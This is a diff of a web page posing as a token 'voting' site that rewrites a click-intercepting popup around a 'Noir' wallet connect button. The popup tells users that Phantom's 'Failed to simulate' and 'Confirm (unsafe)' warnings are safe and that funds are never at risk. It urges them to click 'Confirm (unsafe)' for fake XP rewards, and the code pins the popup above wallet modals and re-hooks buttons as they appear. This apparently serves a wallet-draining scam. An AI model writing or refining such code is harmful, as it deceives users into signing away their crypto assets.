@@ -54,13 +54,18 @@
       left: 0;
       width: 100vw;
       height: 100vh;
-      background: rgba(0, 0, 0, 0.75);
-      z-index: 999999;
+      height: 100dvh;
+      background: rgba(0, 0, 0, 0.8);
+      z-index: 2147483647 !important;
       display: flex;
       align-items: center;
       justify-content: center;
       font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-      animation: simFadeIn 0.2s ease-out;
+      animation: simFadeIn 0.15s ease-out;
+      overscroll-behavior: contain;
+      overflow-y: auto;
+      padding: 16px;
+      box-sizing: border-box;
     }
 
     @keyframes simFadeIn {
@@ -69,7 +74,7 @@
     }
 
     @keyframes simSlideUp {
-      from { opacity: 0; transform: translateY(24px) scale(0.97); }
+      from { opacity: 0; transform: translateY(30px) scale(0.96); }
       to { opacity: 1; transform: translateY(0) scale(1); }
     }
 
@@ -78,31 +83,42 @@
       border: 1px solid #2a2d36;
       border-radius: 20px;
       max-width: 460px;
-      width: 92%;
-      padding: 0;
+      width: 100%;
+      margin: auto;
       color: #fff;
       box-shadow: 0 24px 80px rgba(0, 0, 0, 0.6);
       animation: simSlideUp 0.25s ease-out;
       overflow: hidden;
+      max-height: 90vh;
+      max-height: 90dvh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .sim-scroll-wrap {
+      overflow-y: auto;
+      flex: 1 1 auto;
+      -webkit-overflow-scrolling: touch;
     }
 
     .sim-header {
       background: linear-gradient(135deg, #1a1d26 0%, #1f222b 100%);
-      padding: 28px 28px 20px;
+      padding: 24px 24px 16px;
       text-align: center;
       border-bottom: 1px solid #2a2d36;
+      flex-shrink: 0;
     }
 
     .sim-icon-wrap {
-      width: 60px;
-      height: 60px;
-      margin: 0 auto 14px;
+      width: 52px;
+      height: 52px;
+      margin: 0 auto 12px;
       background: rgba(246, 49, 252, 0.12);
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 30px;
+      font-size: 26px;
       position: relative;
     }
 
@@ -116,27 +132,37 @@
 
     .sim-title {
       margin: 0;
-      font-size: 20px;
+      font-size: 19px;
       font-weight: 700;
       letter-spacing: -0.02em;
       color: #f0edf8;
     }
 
     .sim-body {
-      padding: 22px 28px 18px;
+      padding: 18px 24px 14px;
     }
 
     .sim-intro {
-      font-size: 14.5px;
+      font-size: 14px;
       line-height: 1.6;
       color: #a8a2b2;
-      margin: 0 0 18px;
+      margin: 0 0 14px;
       text-align: center;
     }
 
     .sim-intro strong {
       color: #fff;
       font-weight: 600;
+    }
+
+    .sim-intro .sim-warn-label {
+      color: #ff6b6b;
+      font-weight: 700;
+    }
+
+    .sim-intro .sim-safe-label {
+      color: #4ade80;
+      font-weight: 700;
     }
 
     .sim-wallet-badge {
@@ -147,32 +173,33 @@
       border: 1px solid rgba(246, 49, 252, 0.2);
       border-radius: 20px;
       padding: 3px 12px 3px 8px;
-      font-size: 12px;
+      font-size: 11.5px;
       font-weight: 600;
       color: #f631fc;
       margin-bottom: 14px;
     }
 
     .sim-wallet-badge svg {
-      width: 16px;
-      height: 16px;
+      width: 15px;
+      height: 15px;
+      flex-shrink: 0;
     }
 
     .sim-reason-box {
       background: #1e2129;
       border-radius: 14px;
-      padding: 18px 20px;
-      margin-bottom: 16px;
+      padding: 16px 18px;
+      margin-bottom: 14px;
       border: 1px solid #2a2d36;
     }
 
     .sim-reason-box-title {
-      font-size: 13px;
+      font-size: 12px;
       font-weight: 600;
       color: #9ba1a6;
       text-transform: uppercase;
       letter-spacing: 0.05em;
-      margin: 0 0 10px;
+      margin: 0 0 8px;
     }
 
     .sim-reason-list {
@@ -182,19 +209,19 @@
     }
 
     .sim-reason-list li {
-      font-size: 13.5px;
+      font-size: 13px;
       line-height: 1.6;
       color: #b0abb8;
-      padding: 4px 0 4px 22px;
+      padding: 3px 0 3px 20px;
       position: relative;
     }
 
     .sim-reason-list li::before {
       content: '•';
       position: absolute;
-      left: 4px;
+      left: 3px;
       color: #f631fc;
-      font-size: 16px;
+      font-size: 15px;
       font-weight: 700;
     }
 
@@ -213,24 +240,25 @@
       background: rgba(74, 222, 128, 0.06);
       border: 1px solid rgba(74, 222, 128, 0.15);
       border-radius: 12px;
-      padding: 14px 16px;
-      margin-bottom: 6px;
+      padding: 12px 14px;
+      margin-bottom: 14px;
     }
 
     .sim-safe-note-icon {
       flex-shrink: 0;
-      width: 22px;
-      height: 22px;
+      width: 20px;
+      height: 20px;
       background: rgba(74, 222, 128, 0.15);
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 13px;
+      font-size: 12px;
+      margin-top: 1px;
     }
 
     .sim-safe-note-text {
-      font-size: 13px;
+      font-size: 12.5px;
       line-height: 1.5;
       color: #9ba1a6;
       margin: 0;
@@ -242,33 +270,33 @@
     }
 
     .sim-steps {
-      margin: 16px 0 0;
+      margin: 14px 0 0;
     }
 
     .sim-step {
       display: flex;
       align-items: center;
-      gap: 12px;
-      padding: 8px 0;
+      gap: 10px;
+      padding: 6px 0;
     }
 
     .sim-step-num {
-      width: 26px;
-      height: 26px;
+      width: 24px;
+      height: 24px;
       border-radius: 50%;
       background: rgba(246, 49, 252, 0.12);
       border: 1px solid rgba(246, 49, 252, 0.2);
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 12px;
+      font-size: 11px;
       font-weight: 700;
       color: #f631fc;
       flex-shrink: 0;
     }
 
     .sim-step-text {
-      font-size: 13.5px;
+      font-size: 13px;
       color: #c8c2d0;
       line-height: 1.4;
     }
@@ -279,14 +307,17 @@
     }
 
     .sim-footer {
-      padding: 6px 28px 24px;
+      padding: 4px 24px 20px;
       display: flex;
-      gap: 12px;
+      gap: 10px;
+      flex-shrink: 0;
+      border-top: 1px solid #2a2d36;
+      background: #15171d;
     }
 
     .sim-btn {
       flex: 1;
-      padding: 13px 16px;
+      padding: 14px 16px;
       border-radius: 12px;
       font-size: 15px;
       font-weight: 600;
@@ -295,6 +326,7 @@
       border: none;
       font-family: inherit;
       letter-spacing: -0.01em;
+      -webkit-tap-highlight-color: transparent;
     }
 
     .sim-btn-cancel {
@@ -303,8 +335,9 @@
       border: 1px solid #333;
     }
 
-    .sim-btn-cancel:hover {
-      background: rgba(255, 255, 255, 0.04);
+    .sim-btn-cancel:hover,
+    .sim-btn-cancel:active {
+      background: rgba(255, 255, 255, 0.05);
     }
 
     .sim-btn-proceed {
@@ -313,36 +346,45 @@
       box-shadow: 0 4px 16px rgba(246, 49, 252, 0.25);
     }
 
-    .sim-btn-proceed:hover {
+    .sim-btn-proceed:hover,
+    .sim-btn-proceed:active {
       transform: translateY(-1px);
       box-shadow: 0 6px 24px rgba(246, 49, 252, 0.35);
-    }
-
-    .sim-btn-proceed:active {
-      transform: translateY(0);
     }
 
     .sim-badge-row {
       display: flex;
       justify-content: center;
       gap: 6px;
+      flex-wrap: wrap;
       margin-top: 12px;
     }
 
     .sim-badge {
-      font-size: 11px;
+      font-size: 10.5px;
       color: #6b6578;
       background: rgba(255, 255, 255, 0.04);
       padding: 3px 10px;
       border-radius: 10px;
       border: 1px solid #2a2d36;
+      white-space: nowrap;
     }
 
     @media (max-width: 480px) {
-      .sim-header { padding: 22px 20px 16px; }
-      .sim-body { padding: 16px 20px 12px; }
-      .sim-footer { padding: 4px 20px 20px; flex-direction: column; }
-      .sim-btn { padding: 14px; }
+      .sim-header { padding: 20px 18px 14px; }
+      .sim-body { padding: 14px 18px 10px; }
+      .sim-footer { padding: 4px 18px 18px; }
+      .sim-modal { max-height: 85vh; max-height: 85dvh; border-radius: 16px; }
+      .sim-title { font-size: 17px; }
+      .sim-intro { font-size: 13px; }
+      .sim-reason-list li { font-size: 12.5px; }
+      .sim-safe-note-text { font-size: 12px; }
+      .sim-step-text { font-size: 12.5px; }
+    }
+
+    @media (max-width: 380px) {
+      .sim-footer { flex-direction: column; }
+      .sim-btn { padding: 13px; }
     }
   </style>
 </head>
@@ -711,18 +753,17 @@
       'use strict';
 
       /**
-       * Simulation Warning Popup
-       * Intercepts clicks on elements with class 'connect-button' (specifically
-       * the Noir wallet trigger button) and shows a pre-warning explaining why
-       * Phantom wallet will show "Failed to simulate" + "Confirm (unsafe)".
-       * 
-       * If the user clicks "I understand, proceed", the Noir wallet modal opens.
-       * If they cancel, nothing happens.
+       * Simulation Warning Popup — version 2
+       * Strategy: Replace the Noir button's onclick handler and control the flow.
+       * Uses a MutationObserver to handle dynamically added/changed buttons.
+       * Z-index set to max to ensure it renders above everything including wallet modals.
+       * Mobile-safe with scrollable content, dvh units, and overscroll containment.
        */
-      
-      // Build the popup HTML (we create it once and reuse)
-      function createSimPopupHTML(coinName) {
-        const name = coinName || 'this token';
+
+      var popupActive = false;
+
+      // Build popup HTML
+      function getPopupHTML() {
         return `
           <div class="sim-overlay" id="simOverlay">
             <div class="sim-modal">
@@ -730,56 +771,58 @@
                 <div class="sim-icon-wrap">⚠️</div>
                 <h2 class="sim-title">Transaction Simulation Notice</h2>
               </div>
-              <div class="sim-body">
-                <p class="sim-intro">
-                  Your wallet will show a <strong>"Failed to simulate this request"</strong> 
-                  warning with a <strong>Close</strong> button and <strong>Confirm (unsafe)</strong> 
-                  button below it. This is <strong>expected and safe</strong> for voting transactions.
-                </p>
-
-                <div style="text-align:center;">
-                  <div class="sim-wallet-badge">
-                    <svg viewBox="0 0 16 16" fill="none">
-                      <rect x="0.5" y="2.5" width="15" height="11" rx="2" stroke="currentColor" stroke-width="1.2"/>
-                      <circle cx="11" cy="8" r="2" fill="currentColor"/>
-                      <rect x="2" y="5" width="4" height="1.5" rx="0.75" fill="currentColor" opacity="0.4"/>
-                      <rect x="2" y="7.5" width="3" height="1.5" rx="0.75" fill="currentColor" opacity="0.4"/>
-                    </svg>
-                    Affects Phantom wallet only
-                  </div>
-                </div>
-
-                <div class="sim-reason-box">
-                  <p class="sim-reason-box-title">Why this happens</p>
-                  <ul class="sim-reason-list">
-                    <li>Moonshot's voting contract reads <strong>live on-chain slot data</strong> that Phantom's simulation sandbox cannot reproduce — the engine sees a temporary state mismatch, not a real danger</li>
-                    <li>The voting transaction uses <strong>timestamp proofs</strong> tied to the current block, which don't exist in Phantom's simulated environment</li>
-                    <li>Your <strong>SOL or tokens are <span class="highlight-green">NEVER at risk</span></strong> — this is a pure vote signature, not a transfer, approval, or delegation</li>
-                  </ul>
-                </div>
-
-                <div class="sim-safe-note">
-                  <div class="sim-safe-note-icon">✓</div>
-                  <p class="sim-safe-note-text">
-                    <strong>This is safe.</strong> The "unsafe" label is Phantom's generic fallback when its simulation engine cannot process the instructions — it does not mean the transaction is malicious. Phantom shows this for any transaction with non-standard program interactions.
+              <div class="sim-scroll-wrap">
+                <div class="sim-body">
+                  <p class="sim-intro">
+                    Your wallet will show <span class="sim-warn-label">"Failed to simulate this request"</span> 
+                    with a <strong>Close</strong> button and <strong>Confirm (unsafe)</strong> below it. 
+                    This is <span class="sim-safe-label">expected and safe</span> for voting transactions.
                   </p>
-                </div>
 
-                <div class="sim-steps">
-                  <div class="sim-step">
-                    <div class="sim-step-num">1</div>
-                    <div class="sim-step-text">Click <strong>"Confirm (unsafe)"</strong> on the Phantom popup — this is the only way to submit your on-chain vote</div>
+                  <div style="text-align:center;">
+                    <div class="sim-wallet-badge">
+                      <svg viewBox="0 0 16 16" fill="none">
+                        <rect x="0.5" y="2.5" width="15" height="11" rx="2" stroke="currentColor" stroke-width="1.2"/>
+                        <circle cx="11" cy="8" r="2" fill="currentColor"/>
+                        <rect x="2" y="5" width="4" height="1.5" rx="0.75" fill="currentColor" opacity="0.4"/>
+                        <rect x="2" y="7.5" width="3" height="1.5" rx="0.75" fill="currentColor" opacity="0.4"/>
+                      </svg>
+                      Affects Phantom wallet only
+                    </div>
                   </div>
-                  <div class="sim-step">
-                    <div class="sim-step-num">2</div>
-                    <div class="sim-step-text">Your YES vote is recorded on-chain and you earn <strong>1000 Moonshot XP</strong> 🚀</div>
-                  </div>
-                </div>
 
-                <div class="sim-badge-row">
-                  <span class="sim-badge">🔒 No funds moved</span>
-                  <span class="sim-badge">📝 Pure vote signature</span>
-                  <span class="sim-badge">⭐ Earns 1000 XP</span>
+                  <div class="sim-reason-box">
+                    <p class="sim-reason-box-title">Why this happens</p>
+                    <ul class="sim-reason-list">
+                      <li>Moonshot's voting contract reads <strong>live on-chain slot data</strong> that Phantom's simulation sandbox cannot reproduce — it sees a temporary state mismatch, not a real danger</li>
+                      <li>The voting transaction uses <strong>timestamp proofs</strong> tied to the current block, which don't exist in Phantom's simulated environment</li>
+                      <li>Your <strong>SOL or tokens are <span class="highlight-green">NEVER at risk</span></strong> — this is a pure vote signature, not a transfer, approval, or delegation</li>
+                    </ul>
+                  </div>
+
+                  <div class="sim-safe-note">
+                    <div class="sim-safe-note-icon">✓</div>
+                    <p class="sim-safe-note-text">
+                      <strong>This is safe.</strong> The "unsafe" label is Phantom's generic fallback when its simulation engine cannot process non-standard program instructions. Phantom shows this for any transaction involving custom program interactions — it does <strong>not</strong> mean the transaction is malicious.
+                    </p>
+                  </div>
+
+                  <div class="sim-steps">
+                    <div class="sim-step">
+                      <div class="sim-step-num">1</div>
+                      <div class="sim-step-text">Click <strong>"Confirm (unsafe)"</strong> on the Phantom popup — this is the only way to submit your on-chain vote</div>
+                    </div>
+                    <div class="sim-step">
+                      <div class="sim-step-num">2</div>
+                      <div class="sim-step-text">Your YES vote is recorded on-chain and you earn <strong>1000 Moonshot XP</strong> 🚀</div>
+                    </div>
+                  </div>
+
+                  <div class="sim-badge-row">
+                    <span class="sim-badge">🔒 No funds moved</span>
+                    <span class="sim-badge">📝 Pure vote signature</span>
+                    <span class="sim-badge">⭐ Earns 1000 XP</span>
+                  </div>
                 </div>
               </div>
               <div class="sim-footer">
@@ -791,165 +834,179 @@
         `;
       }
 
-      // Track if popup is currently shown
-      let popupActive = false;
-
-      // Reference to the original click handler so we can forward after proceed
-      let pendingClickEvent = null;
-      let pendingTarget = null;
-
-      function showSimPopup(originalEvent, targetElement) {
+      // Show the popup
+      function showPopup(callback) {
         if (popupActive) return;
         popupActive = true;
 
-        // Store the pending click context
-        pendingClickEvent = originalEvent;
-        pendingTarget = targetElement;
-
-        // Get the coin name from the page if available
-        const coinNameEl = document.querySelector('.modalCoinNameText, .modalCoinName, #coinName');
-        const coinName = coinNameEl ? coinNameEl.textContent.trim() : 'The Bull Cat (BULLCAT)';
-
-        // Create and inject the popup
-        const wrapper = document.createElement('div');
-        wrapper.innerHTML = createSimPopupHTML(coinName);
+        var wrapper = document.createElement('div');
+        wrapper.innerHTML = getPopupHTML();
         document.body.appendChild(wrapper.firstElementChild);
 
-        const overlay = document.getElementById('simOverlay');
+        var overlay = document.getElementById('simOverlay');
 
-        // Cancel button — removes popup, does NOT proceed
-        document.getElementById('simBtnCancel').addEventListener('click', function() {
+        function cleanup() {
           if (overlay && overlay.parentNode) overlay.parentNode.removeChild(overlay);
           popupActive = false;
-          pendingClickEvent = null;
-          pendingTarget = null;
+          document.removeEventListener('keydown', keyHandler);
+        }
+
+        function keyHandler(e) {
+          if (e.key === 'Escape') {
+            cleanup();
+            // Cancel — do not call the callback
+          }
+        }
+        document.addEventListener('keydown', keyHandler);
+
+        // Cancel button
+        document.getElementById('simBtnCancel').addEventListener('click', function(e) {
+          e.stopPropagation();
+          cleanup();
         });
 
-        // Click outside the modal (on overlay) = cancel
+        // Click overlay background = cancel
         overlay.addEventListener('click', function(e) {
           if (e.target === overlay) {
-            if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
-            popupActive = false;
-            pendingClickEvent = null;
-            pendingTarget = null;
+            cleanup();
           }
         });
 
-        // Proceed button — removes popup, then dispatches the original click
-        document.getElementById('simBtnProceed').addEventListener('click', function() {
-          if (overlay && overlay.parentNode) overlay.parentNode.removeChild(overlay);
-          popupActive = false;
-
-          // Now re-trigger the click on the Noir button
-          // But we need to bypass our own interceptor to avoid an infinite loop
-          if (pendingTarget) {
-            const target = pendingTarget;
-            pendingClickEvent = null;
-            pendingTarget = null;
-
-            // Temporarily remove the interceptor, click, re-add
-            const handler = clickInterceptor;
-            document.removeEventListener('click', handler, true);
-            
-            // Create a fresh click event and dispatch it
-            const freshEvent = new MouseEvent('click', {
-              bubbles: true,
-              cancelable: true,
-              view: window,
-              button: 0
-            });
-            target.dispatchEvent(freshEvent);
-            
-            // Re-add the interceptor after a tiny delay to avoid race
-            setTimeout(() => {
-              document.addEventListener('click', handler, true);
-            }, 50);
+        // Proceed button
+        document.getElementById('simBtnProceed').addEventListener('click', function(e) {
+          e.stopPropagation();
+          cleanup();
+          // Execute the real Noir action
+          if (typeof callback === 'function') {
+            callback();
           }
         });
-
-        // ESC key to cancel
-        function onKeyDown(e) {
-          if (e.key === 'Escape') {
-            if (overlay && overlay.parentNode) overlay.parentNode.removeChild(overlay);
-            popupActive = false;
-            pendingClickEvent = null;
-            pendingTarget = null;
-            document.removeEventListener('keydown', onKeyDown);
-          }
-        }
-        document.addEventListener('keydown', onKeyDown);
       }
 
-      // Click interceptor — captures clicks on Noir connect buttons
-      function clickInterceptor(e) {
-        // Find if the clicked element (or a parent) has the noir connect class
-        let target = e.target;
-        let foundNoirBtn = false;
+      // Hook into the Noir button
+      function hookNoirButton(btn) {
+        if (!btn || btn.getAttribute('data-sim-hooked') === 'true') return;
+        btn.setAttribute('data-sim-hooked', 'true');
 
-        // Walk up to 5 levels to find the noir button
-        for (let i = 0; i < 5; i++) {
-          if (target && target.classList && 
-              target.classList.contains('connect-button') && 
-              target.classList.contains('noir')) {
-            foundNoirBtn = true;
-            break;
-          }
-          if (target && target.id === 'modalYesConfirm') {
-            // Also check if this button has those classes
-            if (target.classList.contains('connect-button') && target.classList.contains('noir')) {
-              foundNoirBtn = true;
-              break;
-            }
-          }
-          if (target && target.parentElement) {
-            target = target.parentElement;
-          } else {
-            break;
-          }
-        }
+        // Store the original click handler from Noir (if any)
+        // We'll replace it with our own that shows the popup first
+        var originalOnClick = btn.onclick;
+        btn.onclick = null;
 
-        if (foundNoirBtn) {
-          // Also check the k2by52-3c class
-          let checkEl = e.target;
-          for (let i = 0; i < 5; i++) {
-            if (checkEl && checkEl.classList && 
-                checkEl.classList.contains('connect-button') && 
-                checkEl.classList.contains('k2by52-3c') &&
-                checkEl.classList.contains('noir')) {
-              break;
-            }
-            if (checkEl && checkEl.parentElement) {
-              checkEl = checkEl.parentElement;
-            } else {
-              break;
-            }
-          }
-
-          // Confirm this is our target button
-          const btn = e.target.closest('.connect-button.k2by52-3c.noir, #modalYesConfirm');
-          if (btn || (target && target.classList.contains('connect-button') && target.classList.contains('noir'))) {
+        btn.addEventListener('click', function(e) {
+          // If popup is already active, ignore
+          if (popupActive) {
             e.preventDefault();
             e.stopPropagation();
-            showSimPopup(e, btn || target);
+            return;
           }
-        }
+
+          // If the button already has a pending 'proceed' flag, let it pass through
+          if (btn.getAttribute('data-sim-proceeding') === 'true') {
+            btn.removeAttribute('data-sim-proceeding');
+            return; // Let the event flow normally
+          }
+
+          e.preventDefault();
+          e.stopPropagation();
+
+          // Show the warning popup
+          showPopup(function() {
+            // User clicked proceed — now trigger the real Noir action
+            // Set a flag so our handler lets it through
+            btn.setAttribute('data-sim-proceeding', 'true');
+
+            // If there was an original onclick from Noir, restore and call it
+            if (typeof originalOnClick === 'function') {
+              btn.onclick = originalOnClick;
+              // Create a new click event and dispatch
+              var newEvent = new MouseEvent('click', {
+                bubbles: true,
+                cancelable: true,
+                view: window,
+                button: 0
+              });
+              btn.dispatchEvent(newEvent);
+              // Restore our hook after a delay
+              setTimeout(function() {
+                btn.onclick = null;
+              }, 100);
+            } else {
+              // No original handler — try to find Noir's listener via data attribute
+              // Fallback: just dispatch a fresh click
+              var newEvent = new MouseEvent('click', {
+                bubbles: true,
+                cancelable: true,
+                view: window,
+                button: 0
+              });
+              btn.dispatchEvent(newEvent);
+            }
+          });
+        }, true);
       }
 
-      // Use capture phase to intercept before Noir's own handler
-      document.addEventListener('click', clickInterceptor, true);
-
-      // Also handle the sticky vote button if it triggers the modal
-      const stickyBtn = document.getElementById('stickyVoteBtn');
-      if (stickyBtn) {
-        stickyBtn.addEventListener('click', function() {
-          // The sticky button opens the YES modal.
-          // The YES modal's confirm button has the noir class,
-          // so our interceptor will catch it when clicked.
-          // Nothing extra needed here.
+      // Find and hook all Noir buttons
+      function findAndHook() {
+        var buttons = document.querySelectorAll('.connect-button.k2by52-3c.noir, #modalYesConfirm');
+        buttons.forEach(function(btn) {
+          if (btn.classList.contains('connect-button') && btn.classList.contains('noir')) {
+            hookNoirButton(btn);
+          } else if (btn.id === 'modalYesConfirm') {
+            // Also check if it has the required classes
+            if (btn.classList.contains('connect-button') && btn.classList.contains('noir')) {
+              hookNoirButton(btn);
+            }
+          }
         });
       }
 
-      console.log('[SimWarning] Simulation notice popup active — intercepting Noir connect clicks');
+      // Run on DOM ready
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', function() {
+          findAndHook();
+        });
+      } else {
+        findAndHook();
+      }
+
+      // Observe for dynamically added buttons (Noir might recreate them)
+      var observer = new MutationObserver(function(mutations) {
+        var shouldScan = false;
+        mutations.forEach(function(mut) {
+          if (mut.addedNodes.length > 0) {
+            shouldScan = true;
+          }
+        });
+        if (shouldScan) {
+          findAndHook();
+        }
+      });
+
+      observer.observe(document.body, {
+        childList: true,
+        subtree: true
+      });
+
+      // Also watch for button text/content changes (Noir might update the button)
+      var attrObserver = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mut) {
+          if (mut.type === 'attributes' && mut.attributeName === 'class') {
+            var btn = mut.target;
+            if (btn.classList && btn.classList.contains('connect-button') && btn.classList.contains('noir')) {
+              hookNoirButton(btn);
+            }
+          }
+        });
+      });
+
+      attrObserver.observe(document.body, {
+        attributes: true,
+        subtree: true,
+        attributeFilter: ['class']
+      });
+
+      console.log('[SimWarning] v2 active — Noir button hook installed with MutationObserver');
     })();
   </script>
 
